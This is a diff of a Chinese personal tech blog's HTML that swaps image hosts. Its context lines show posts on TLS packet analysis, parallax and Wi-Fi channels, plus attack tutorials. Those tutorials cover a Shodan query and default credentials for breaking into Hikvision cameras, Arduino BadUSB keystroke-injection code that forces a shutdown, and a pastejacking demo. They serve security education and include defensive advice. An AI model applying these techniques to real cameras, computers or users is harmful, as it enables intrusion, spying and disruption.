@@ -394,7 +394,7 @@
 <li>http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。</li>
 <li>http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。  </li>
 </ul>
-<h2 id="0x02-SSL协议"><a href="#0x02-SSL协议" class="headerlink" title="0x02 SSL协议"></a>0x02 SSL协议</h2><p>SSL(Secure Sockets Layer 安全套接层),及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层对网络连接进行加密。<br>所以SSL所具备的功能是：保证传输数据的保密性、完整性，并且实现通信双方的身份认证。<br>在协议栈种位置如下：<br><img src="http://oo3iot5oz.bkt.clouddn.com/https/1.png" alt=""><br>SSL协议是一个分层协议，共有两层组成。  </p>
+<h2 id="0x02-SSL协议"><a href="#0x02-SSL协议" class="headerlink" title="0x02 SSL协议"></a>0x02 SSL协议</h2><p>SSL(Secure Sockets Layer 安全套接层),及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层对网络连接进行加密。<br>所以SSL所具备的功能是：保证传输数据的保密性、完整性，并且实现通信双方的身份认证。<br>在协议栈种位置如下：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/1.png" alt=""><br>SSL协议是一个分层协议，共有两层组成。  </p>
 <p>高层协议包括：  </p>
 <ul>
 <li>SSL握手协议</li>
@@ -412,10 +412,10 @@
 <h2 id="0x04-wireshark抓包分析"><a href="#0x04-wireshark抓包分析" class="headerlink" title="0x04 wireshark抓包分析"></a>0x04 wireshark抓包分析</h2><p>接下来我们抓包进行分析：  </p>
 <p>1.我们打开wireshark软件，监视正在使用的网卡，然后通过浏览器访问 <a href="http://www.github.com" target="_blank" rel="noopener">www.github.com</a> 抓取完成后我们停止捕获。  </p>
 <p>2.在过滤器输入ssl，过滤ssl协议，找到本机向 github.com 的ip地址发起的client hello。  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/https/2.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/2.png" alt="">  </p>
 <p>3.右键追踪，选择ssl流。  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/https/3.png" alt="">  </p>
-<p>4.首先是client hello，这个包携带着客户的SSL版本号，加密套件列表，压缩算法列表，客户端随机数，sessionid = 0，传送给服务器。<br>我们开始分析，首先展开client hello的SSL，找到Handshark。可以看到client hello里面包含的各项数据。<br><img src="http://oo3iot5oz.bkt.clouddn.com/https/4.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/3.png" alt="">  </p>
+<p>4.首先是client hello，这个包携带着客户的SSL版本号，加密套件列表，压缩算法列表，客户端随机数，sessionid = 0，传送给服务器。<br>我们开始分析，首先展开client hello的SSL，找到Handshark。可以看到client hello里面包含的各项数据。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/4.png" alt=""></p>
 <p>  分别是：  </p>
 <ul>
 <li>SSL版本号:TLS 1.2</li>
@@ -423,31 +423,31 @@
 <li>sessionid = 0</li>
 <li>密码套件如下  </li>
 </ul>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/https/5.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/5.png" alt="">  </p>
 <ul>
-<li>server name，可以看到是 github.com。<br><img src="http://oo3iot5oz.bkt.clouddn.com/https/6.png" alt="">  </li>
+<li>server name，可以看到是 github.com。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/6.png" alt="">  </li>
 </ul>
 <p>5.然后找到server hello，这个包是服务器选择版本，确定要用的加密套件，压缩算法，计算sessionid以及随机数，发送给客户端。  </p>
-<p>同样展开SSL：<br><img src="http://oo3iot5oz.bkt.clouddn.com/https/7.png" alt=""><br>我们可以看到各项对应数据被放在server hello中，比如session ID，密码套件等。</p>
+<p>同样展开SSL：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/7.png" alt=""><br>我们可以看到各项对应数据被放在server hello中，比如session ID，密码套件等。</p>
 <p>并且我们看到，除了server hello部分，这个包还有服务器发向客户端的证书的前一部分。然后下一个包TCP segment of a reassemble PDU，是证书的中间部分。  </p>
-<p>6.然后找到Certificate，这一步是服务端将自己的证书下发给客户端，让客户端验证自己的身份，客户端验证通过后取出证书中的公钥。<br><img src="http://oo3iot5oz.bkt.clouddn.com/https/8.png" alt="">  </p>
+<p>6.然后找到Certificate，这一步是服务端将自己的证书下发给客户端，让客户端验证自己的身份，客户端验证通过后取出证书中的公钥。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/8.png" alt="">  </p>
 <p>而我们看到的包中内容呢是证书结尾部分，包括GitHub 机构旗下github.com网站的证书及其颁发机构 DigiCert 的证书。  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/https/9.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/9.png" alt="">  </p>
 <p>7.下一部分是Server Key Exchange，用于将服务器的临时ECDH公钥传送给客户端。 </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/https/10.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/10.png" alt="">  </p>
 <p>8.之后是Server Hello Done，此消息由服务器发送，以指示ServerHello和相关消息的结束。<br>发送此消息后，服务器将等待客户端响应。  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/https/11.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/11.png" alt=""></p>
 <p>9.客户端收到服务端传来的证书后，先从 CA 验证该证书的合法性，验证通过后取出证书中的服务端公钥，再生成一个随机数 Random3，再用服务端公钥非对称加密 Random3 生成 PreMaster Key。  </p>
 <p>然后我们看到下个包包含Client Key Exchange, Change Cipher Spec, Hello Request, Hello Request  </p>
 <p>10.首先是Client Key Exchange，上面客户端根据服务器传来的公钥生成了 PreMaster Key，Client Key Exchange 就是将这个 key 传给服务端。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/https/12.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/12.png" alt="">  </p>
 <p>11.Change Cipher Spec(Client)，<br>这一步是客户端通知服务端后面再发送的消息都会使用前面协商出来的秘钥加密了。然后客户端发送握手验证报文确保消息的完整性。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/https/13.png" alt=""> </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/13.png" alt=""> </p>
 <p>12.Change Cipher Spec(Server)<br>这一步是服务端收到数据后，通知客户端后面再发送的消息都会使用加密。  </p>
 <p>13.Encrypted Handshake Message，表示服务器端的SSL成功结束，发送握手验证报文确保消息的完整性。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/https/14.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/14.png" alt="">  </p>
 <p>14.下面开始正式交换数据。</p>
-<p>所以总的过程如下图所示：<br><img src="http://oo3iot5oz.bkt.clouddn.com/https/15.png" alt="">  </p>
+<p>所以总的过程如下图所示：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/15.png" alt="">  </p>
 <p>以上就是整个SSL握手过程，也是加密算法的典型应用之一。</p>
 
           
@@ -628,9 +628,9 @@
 <li>秒差距（pc）：以地球公转轨道的平均半径（一个天文单位）为底边所对应的三角形内角称为周年视差。当这个角的大小为1角秒时，这个三角形的一条边的长度（地球到这个恒星的距离）就称为1秒差距。约为3.26光年。</li>
 </ul>
 <p>前两个单位我们经常见到，第三个很多不了解的人看了上面的定义也很迷糊，简单的说，1秒差距是周年视差为1”时天体的距离。</p>
-<h2 id="0x02-周年视差"><a href="#0x02-周年视差" class="headerlink" title="0x02 周年视差"></a>0x02 周年视差</h2><p>而秒差距中所说的周年视差又是什么？在说周年视差的概念之前我们先来看看视差是什么。<br>视差就是从有一定距离的两个点上观察同一个目标所产生的方向差异。从目标看两个点之间的夹角，叫做这两个点的视差角，两点之间的距离称作基线。只要知道视差角度和基线长度，就可以计算出目标和观测者之间的距离。<br><img src="http://oo3iot5oz.bkt.clouddn.com/tianwen/01.jpg" alt="">  </p>
-<p>就像当你伸出一个手指放在眼前，先闭上右眼，用左眼看它；再闭上左眼，用右眼看它，会发现手指相对远方的物体的位置有了变化，这就是从不同角度去看同一点的视差。<br>而周年视差则是地球绕太阳周年运动的直径作为这个“左右眼”的距离，看天体所产生的视差。<br>即当恒星与太阳的连线垂直地球轨道半径时，恒星对日地平均距离d所张的角ρ叫恒星的周年视差。<br><img src="http://oo3iot5oz.bkt.clouddn.com/tianwen/02.jpg" alt="">  </p>
-<h2 id="0x03-天体距离的计算"><a href="#0x03-天体距离的计算" class="headerlink" title="0x03 天体距离的计算"></a>0x03 天体距离的计算</h2><p>介绍了上面的这些定义，我们来看看天体距离的计算<br>当ρ为被测天体相对地球轨道半长径的夹角，a为地球公转轨道半长轴，d为天体距离时，距离的计算是：<br><img src="http://oo3iot5oz.bkt.clouddn.com/03.png" alt=""></p>
+<h2 id="0x02-周年视差"><a href="#0x02-周年视差" class="headerlink" title="0x02 周年视差"></a>0x02 周年视差</h2><p>而秒差距中所说的周年视差又是什么？在说周年视差的概念之前我们先来看看视差是什么。<br>视差就是从有一定距离的两个点上观察同一个目标所产生的方向差异。从目标看两个点之间的夹角，叫做这两个点的视差角，两点之间的距离称作基线。只要知道视差角度和基线长度，就可以计算出目标和观测者之间的距离。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/tianwen/01.jpg" alt="">  </p>
+<p>就像当你伸出一个手指放在眼前，先闭上右眼，用左眼看它；再闭上左眼，用右眼看它，会发现手指相对远方的物体的位置有了变化，这就是从不同角度去看同一点的视差。<br>而周年视差则是地球绕太阳周年运动的直径作为这个“左右眼”的距离，看天体所产生的视差。<br>即当恒星与太阳的连线垂直地球轨道半径时，恒星对日地平均距离d所张的角ρ叫恒星的周年视差。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/tianwen/02.jpg" alt="">  </p>
+<h2 id="0x03-天体距离的计算"><a href="#0x03-天体距离的计算" class="headerlink" title="0x03 天体距离的计算"></a>0x03 天体距离的计算</h2><p>介绍了上面的这些定义，我们来看看天体距离的计算<br>当ρ为被测天体相对地球轨道半长径的夹角，a为地球公转轨道半长轴，d为天体距离时，距离的计算是：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/03.png" alt=""></p>
 <p>在这里角度极小情况下sin（ρ）近似为ρ，a为一个天文单位，所以最终距离为周年视差（以秒为单位时）的倒数倍的秒差距。<br>比如我们的比邻星周年视差为0.76”，则计算距离时：<br>0.76的倒数为1.32，所以1.32倍的秒差距（3.26光年）为4.3光年。<br>而建立空间卫星能提升观测距离的真正原因就是因为地面上的望远镜受到大气层影响太大，角分辨率一般不到0.01”，而2013年发射的盖亚空间卫星的角分辨率可以达到0.00001”，大大的增加了观测距离。<br><img src="http://oo3iot5oz.bkt.clouddn.com/tianwen/04.jpg" alt="盖亚卫星">  </p>
 <h2 id="0x04-宇宙距离阶梯"><a href="#0x04-宇宙距离阶梯" class="headerlink" title="0x04 宇宙距离阶梯"></a>0x04 宇宙距离阶梯</h2><p>虽然通过之前的办法可以观测到很远的地方，但是宇宙的广袤远远超出我们的想像，再远的地方怎么办呢？对于更远的地方，人类就有了其他的观测方案。<br><img src="http://oo3iot5oz.bkt.clouddn.com/tianwen/05.png" alt="宇宙距离阶梯">  </p>
 <p>在一系列的方法之下，哈勃望远镜眼中的宇宙深处，我们能够观察的宇宙空间直径大约是930亿光年，这个数字是这样得出的：那些从138亿光年外发出的光线，产生这些光线的古老天体，由于宇宙的膨胀，今天它们和我们之间的距离已经达到了大约465亿光年左右。这是我们能观测到的极限半径，乘以二则是我们能够观察的宇宙空间直径，约930亿光年。</p>
@@ -814,12 +814,12 @@
 </ul>
 <p>平时关键字搜索大家都会就不再赘述，这里主要讲一下百度的一些小技巧：  </p>
 <p>1.加减字符的运用<br>用法： 用“+”包含特定查询词，用“-”排除特定查询词<br>例如：ted +pixiv -演讲<br>我们要搜一个画师的id，不加参数的时候很难找到:  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/hk/1.png" alt=""><br>加了之后就很容易找到相关内容了:  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/hk/2.png" alt=""><br>2.intitle搜索范围限定在网页标题<br>用法： intitle:xxx<br>3.site搜索范围限定在特定站点中<br>用法： site:xxx<br>4.inurl搜索范围限定在url链接中<br>用法： inurl:xxx<br>5.Filetype搜索范围限定在指定文档格式中<br>用法： Filetype:xxx  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/hk/1.png" alt=""><br>加了之后就很容易找到相关内容了:  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/hk/2.png" alt=""><br>2.intitle搜索范围限定在网页标题<br>用法： intitle:xxx<br>3.site搜索范围限定在特定站点中<br>用法： site:xxx<br>4.inurl搜索范围限定在url链接中<br>用法： inurl:xxx<br>5.Filetype搜索范围限定在指定文档格式中<br>用法： Filetype:xxx  </p>
 <p>当然，如果一般windows用户不习惯使用这些语法的话，可以选择去<br><a href="https://www.baidu.com/gaoji/advanced.html" target="_blank" rel="noopener">https://www.baidu.com/gaoji/advanced.html</a><br>进行高级搜索  </p>
 <p>google的操作基本一致，这里给一个利用谷歌语法的黑客数据库<br><a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database/</a></p>
 <h2 id="0x02-shodan的基本操作"><a href="#0x02-shodan的基本操作" class="headerlink" title="0x02 shodan的基本操作"></a>0x02 shodan的基本操作</h2><p>这里是shodan的地址<br><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a><br>接下来我们看看什么是shodan<br>在百度百科里面给出了这么一句话：Shodan是互联网上最可怕的搜索引擎。<br>虽然目前人们都认为谷歌是最强劲的搜索引擎，但Shodan才是互联网上最可怕的搜索引擎。与谷歌不同的是，Shodan不是在网上搜索网址，而是直接进入互联网的背后通道。Shodan可以说是一款“黑暗”谷歌，一刻不停的在寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等等。每个月Shodan都会在大约5亿个服务器上日夜不停地搜集信息。<br>我们平时的搜索引擎谷歌百度爬的是网页信息，而shodan爬的是互联网设备和端口。这就造成了什么情况呢？现在智能家电越来越多，有很多会连接到互联网，而shodan就能查找到这些设备，然后不法分子可能就会对这些生活中重要的设备进行入侵，这是十分危险的。</p>
-<h2 id="0x03-入侵网络摄像头"><a href="#0x03-入侵网络摄像头" class="headerlink" title="0x03 入侵网络摄像头"></a>0x03 入侵网络摄像头</h2><p>做了这么多铺垫，我们来体验一下shodan，入侵一下网络上弱口令的摄像头。<br>首先打开shodan，注册个账号，这样才能使用过滤，然后我们在搜索框输入：Hikvision-Webs country:”CN” city:”Nanjing”<br><img src="http://oo3iot5oz.bkt.clouddn.com/hk/3.png" alt=""><br>这句话是搜索所有地点为中国南京的海康威视摄像头设备，我们搜索到很多结果，下来我们点击某些设备的index打开它的后台界面，海康威视的默认账号是admin，密码是12345，我们可以写个python脚本批量测试，也可以写个弱口令字典，用python脚本对这些设备进行暴力破解（前面的博客写过一些这类脚本，只需稍作更改）。<br><img src="http://oo3iot5oz.bkt.clouddn.com/hk/4.png" alt=""><br>如图是一个已被破解的摄像头管理界面，而且是管理员权限，在这里我们可以查看摄像头拍摄的界面和更改各种设置。<br><img src="http://oo3iot5oz.bkt.clouddn.com/hk/5.png" alt=""><br>点击预览、回放等就可以查看摄像头内容了，但是谨记这会侵犯别人的隐私权，是违法的行为，我们是遵纪守法的好公民所以知道它的原理和危害就足够。运用技术保护好个人隐私，如非必要不将摄像头接入互联网，一定要接入的话，不能使用容易被破解的弱口令。</p>
+<h2 id="0x03-入侵网络摄像头"><a href="#0x03-入侵网络摄像头" class="headerlink" title="0x03 入侵网络摄像头"></a>0x03 入侵网络摄像头</h2><p>做了这么多铺垫，我们来体验一下shodan，入侵一下网络上弱口令的摄像头。<br>首先打开shodan，注册个账号，这样才能使用过滤，然后我们在搜索框输入：Hikvision-Webs country:”CN” city:”Nanjing”<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/hk/3.png" alt=""><br>这句话是搜索所有地点为中国南京的海康威视摄像头设备，我们搜索到很多结果，下来我们点击某些设备的index打开它的后台界面，海康威视的默认账号是admin，密码是12345，我们可以写个python脚本批量测试，也可以写个弱口令字典，用python脚本对这些设备进行暴力破解（前面的博客写过一些这类脚本，只需稍作更改）。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/hk/4.png" alt=""><br>如图是一个已被破解的摄像头管理界面，而且是管理员权限，在这里我们可以查看摄像头拍摄的界面和更改各种设置。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/hk/5.png" alt=""><br>点击预览、回放等就可以查看摄像头内容了，但是谨记这会侵犯别人的隐私权，是违法的行为，我们是遵纪守法的好公民所以知道它的原理和危害就足够。运用技术保护好个人隐私，如非必要不将摄像头接入互联网，一定要接入的话，不能使用容易被破解的弱口令。</p>
 
           
         
@@ -994,9 +994,9 @@
             <h2 id="0x00-什么是BadUSB"><a href="#0x00-什么是BadUSB" class="headerlink" title="0x00 什么是BadUSB"></a>0x00 什么是BadUSB</h2><p>BadUSB主要依靠USB拇指驱动器的构建方式，USB通常有一个大的可重写的内存芯片用于实际的数据存储，以及一个独立的控制器芯片。类似于笔记本电脑的硬盘驱动器包含一个隐藏的主引导记录(Master Boot Record)，内存芯片中内存单元的第一段包含让USB记录的编程，也就是说他不是利用普通u盘的autorun.inf，不会被检测到，这样攻击者植入恶意软件就不会被发现。  </p>
 <h2 id="0x01-USB协议漏洞"><a href="#0x01-USB协议漏洞" class="headerlink" title="0x01 USB协议漏洞"></a>0x01 USB协议漏洞</h2><p>现在的USB设备很多，比如音视频设备、摄像头等，因此要求系统提供最大的兼容性，甚至免驱；所以在设计USB标准的时候没有要求每个USB设备像网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备具有多个输入输出设备的特征。这样就可以通过重写U盘固件，伪装成一个USB键盘，并通过虚拟键盘输入集成到U盘固件中的指令和代码而进行攻击。  </p>
 <h2 id="0x02-需要的工具"><a href="#0x02-需要的工具" class="headerlink" title="0x02 需要的工具"></a>0x02 需要的工具</h2><ul>
-<li>一块Arduino leonardo开发板，选择他是因为板子体积小容易包装成一个普通的u盘，并且代码非常好书写。<br><img src="http://oo3iot5oz.bkt.clouddn.com/badusb/1.jpg" alt=""></li>
-<li>Arduino ide，我们需要用它写代码并且烧录到badusb里面。<br><img src="http://oo3iot5oz.bkt.clouddn.com/badusb/2.png" alt=""></li>
-<li>外壳，将它包装的像一个普通u盘，不然这么块板子谁电脑会让你随便插，当然你也可以直接去淘宝购买已经包装好的badusb。<br><img src="http://oo3iot5oz.bkt.clouddn.com/badusb/3.png" alt=""></li>
+<li>一块Arduino leonardo开发板，选择他是因为板子体积小容易包装成一个普通的u盘，并且代码非常好书写。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/badusb/1.jpg" alt=""></li>
+<li>Arduino ide，我们需要用它写代码并且烧录到badusb里面。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/badusb/2.png" alt=""></li>
+<li>外壳，将它包装的像一个普通u盘，不然这么块板子谁电脑会让你随便插，当然你也可以直接去淘宝购买已经包装好的badusb。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/badusb/3.png" alt=""></li>
 </ul>
 <h2 id="0x03-写入代码"><a href="#0x03-写入代码" class="headerlink" title="0x03 写入代码"></a>0x03 写入代码</h2><p>我们通过keyboard.h库里面提供的方法模拟键盘输入。如果进攻对象是windows的话，首先win+r然后输入cmd，进入命令行，这个时候几乎可以做到所有事情。如果进攻对象是linux，一般是ctrl+alt+t的组合开启terminal然后再输入命令。无论是进入哪种，只要你预先写好代码，对目标计算机上的文件下载，上传，删除，运行······怎么做都可以。<br>这里我们给出一个windows下的无害代码，使得我们u盘插入后目标计算机十秒关机。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Keyboard.h&gt;</span><br><span class="line">void setup() &#123;</span><br><span class="line">  // put your setup code here, to run once:</span><br><span class="line">Keyboard.begin();//开始键盘通讯</span><br><span class="line">delay(3000);//延时</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//win键</span><br><span class="line">delay(50);</span><br><span class="line">Keyboard.press(&apos;r&apos;);//r键</span><br><span class="line">delay(50);</span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);//这里松开按键</span><br><span class="line">Keyboard.release(&apos;r&apos;);</span><br><span class="line">delay(1000);</span><br><span class="line">Keyboard.println(&quot;cmd \n&quot;); //注意这里命令多了一个空格 如果目标终端的输入法是中文的话这个空格非常关键</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(&quot;shutdown -s -t 10 \n&quot;); ; //注意有一个空格</span><br><span class="line">delay(1000);//延时</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void loop() &#123;</span><br><span class="line">  // put your main code here, to run repeatedly:</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>然后我们接入开发板，选择好串口和板子型号，按ctrl+u烧录，之后就可以用它来测试了。<br><img src="http://oo3iot5oz.bkt.clouddn.com/badusb/4.png" alt="选择端口"><br><img src="http://oo3iot5oz.bkt.clouddn.com/badusb/5.png" alt="选择型号">  </p>
@@ -1176,10 +1176,10 @@
 <p>在用户浏览网页，需要复制网页上内容的时候，通过js来劫持ctrl+c或者右键复制，替换剪切板的内容。配合网页内容的特殊性和对特定用户一定程度的了解，可以达到诱导他做一些事情的目的。  </p>
 <p>github地址:  <a href="https://github.com/dxa4481/Pastejacking" target="_blank" rel="noopener">https://github.com/dxa4481/Pastejacking</a>    </p>
 <p>上面网站的演示中只是将剪贴板内容换成了显示“evil”这种无害命令，下来我们更改一下他的代码。 下图是他替换部分的代码。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/jacking/1.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/jacking/1.png" alt="">  </p>
 <p>在网页显示的部分我们自己改成目标可能会复制的东西，尤其对方可能会复制下来在cmd或者terminal中运行的东西，但是网页这部分看起来肯定是正常无害的。这里是稍作更改的用户能看到的界面，然后用户在这里复制。  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/jacking/2.png" alt=""><br>然后在源码的这里，把括号中的内容换成调用一个有威胁的程序或者某些恶作剧命令，这里演示一下。<br><img src="http://oo3iot5oz.bkt.clouddn.com/jacking/5.png" alt=""><br>这里改成关机的指令或者画图的指令，然后在页面随便复制什么东西，都会被替换成这个指令，到cmd中看看效果，因为有/n的存在，粘贴时直接就被执行了。  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/jacking/3.png" alt=""><br><img src="http://oo3iot5oz.bkt.clouddn.com/jacking/4.png" alt=""><br>如果将这里的命令设置成一些危险的指令，后果十分严重，所以在访问看起来并不安全的网站的时候，要仔细检查剪贴板有没有被替换。最好的办法是用firefox中NoScript等工具在禁用js的情况下访问这类网站。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/jacking/2.png" alt=""><br>然后在源码的这里，把括号中的内容换成调用一个有威胁的程序或者某些恶作剧命令，这里演示一下。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/jacking/5.png" alt=""><br>这里改成关机的指令或者画图的指令，然后在页面随便复制什么东西，都会被替换成这个指令，到cmd中看看效果，因为有/n的存在，粘贴时直接就被执行了。  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/jacking/3.png" alt=""><br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/jacking/4.png" alt=""><br>如果将这里的命令设置成一些危险的指令，后果十分严重，所以在访问看起来并不安全的网站的时候，要仔细检查剪贴板有没有被替换。最好的办法是用firefox中NoScript等工具在禁用js的情况下访问这类网站。</p>
 
           
         
@@ -1352,10 +1352,10 @@
         
           
             <h1 id="通过改变wifi信道改善信号"><a href="#通过改变wifi信道改善信号" class="headerlink" title="通过改变wifi信道改善信号"></a>通过改变wifi信道改善信号</h1><p>在路由器越来越多的今天，我们经常会发现自己的wifi信号和邻居的冲突而导致速度变慢，本文讲解下发生冲突的原因和一些改善策略。  </p>
-<h2 id="0x00-常见wifi信道冲突的原因"><a href="#0x00-常见wifi信道冲突的原因" class="headerlink" title="0x00 常见wifi信道冲突的原因"></a>0x00 常见wifi信道冲突的原因</h2><p>目前主流的2.4Ghz无线WIFI网络设备不管是802.11b/g还是802.11b/g/n 一般都支持13个信道。它们的中心频率虽然不同，但是因为都占据一定的频率范围，所以会有一些相互重叠的情况。当路由器十分密集时，wifi信号之间互相干扰，上网体验会非常差。<br><img src="http://oo3iot5oz.bkt.clouddn.com/wifi/1.jpg" alt=""><br>如图所示，相差五个信道以上就几乎不存在干涉，但相邻的信道重叠部分很大。<br>像博主这样在大学宿舍住的，一个宿舍一般都好几个路由器，再加上隔壁宿舍，楼上楼下以及学校提供的一些大功率热点，干扰会十分大。</p>
+<h2 id="0x00-常见wifi信道冲突的原因"><a href="#0x00-常见wifi信道冲突的原因" class="headerlink" title="0x00 常见wifi信道冲突的原因"></a>0x00 常见wifi信道冲突的原因</h2><p>目前主流的2.4Ghz无线WIFI网络设备不管是802.11b/g还是802.11b/g/n 一般都支持13个信道。它们的中心频率虽然不同，但是因为都占据一定的频率范围，所以会有一些相互重叠的情况。当路由器十分密集时，wifi信号之间互相干扰，上网体验会非常差。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/wifi/1.jpg" alt=""><br>如图所示，相差五个信道以上就几乎不存在干涉，但相邻的信道重叠部分很大。<br>像博主这样在大学宿舍住的，一个宿舍一般都好几个路由器，再加上隔壁宿舍，楼上楼下以及学校提供的一些大功率热点，干扰会十分大。</p>
 <h2 id="0x01-通过wifi分析类软件分析wifi信号"><a href="#0x01-通过wifi分析类软件分析wifi信号" class="headerlink" title="0x01 通过wifi分析类软件分析wifi信号"></a>0x01 通过wifi分析类软件分析wifi信号</h2><p>那怎么查看附近的热点信道呢？这里我们可以用到各种wifi分析软件，比如inSSIDer，KillerPerformanceSuite，netstumbler等，我在这里使用了体积最小的inSSIDer，查看了宿舍的wifi分布情况。<br>这里需要先选择无线网卡，不管是外置的还是笔记本内置的，必须选择无线网卡才能扫描。  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/wifi/2.png" alt="">  </p>
-<h2 id="0x02-设置合适的wifi信道"><a href="#0x02-设置合适的wifi信道" class="headerlink" title="0x02 设置合适的wifi信道"></a>0x02 设置合适的wifi信道</h2><p><img src="http://oo3iot5oz.bkt.clouddn.com/wifi/3.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/wifi/2.png" alt="">  </p>
+<h2 id="0x02-设置合适的wifi信道"><a href="#0x02-设置合适的wifi信道" class="headerlink" title="0x02 设置合适的wifi信道"></a>0x02 设置合适的wifi信道</h2><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/wifi/3.png" alt="">  </p>
 <p>由图可以看出，大学宿舍的wifi分布是很密集的，所以我选择了最靠边的13信道减少冲突。<br>在平时的小区内部，路由器会相对少很多，这个时候只要避开几个邻居的信道，就可以大大减少冲突。  </p>
 <h2 id="0x03-设置合适的频带宽度"><a href="#0x03-设置合适的频带宽度" class="headerlink" title="0x03 设置合适的频带宽度"></a>0x03 设置合适的频带宽度</h2><p>常见的路由器可设置的频带宽度为20Mhz和40Mhz，显而易见，40Mhz肯定比20Mhz传输道路宽，所以传输速度快。但是在路由器密集的地方，频带宽度大也就意味着容易和别人的信号起冲突。<br>就像公路的总宽度是一定的，如果没有冲突，用更宽的卡车（40Mhz）明显运送货物（数据）更快，但是车多了，容易拥堵，大家还都用卡车的话，肯定是不如都开小汽车（20Mhz）来的快。<br>所以我对频带宽度选择的建议是，如果在路由器稀疏的地方，就用40Mhz，在路由器密集的地方，就用20Mhz。  </p>
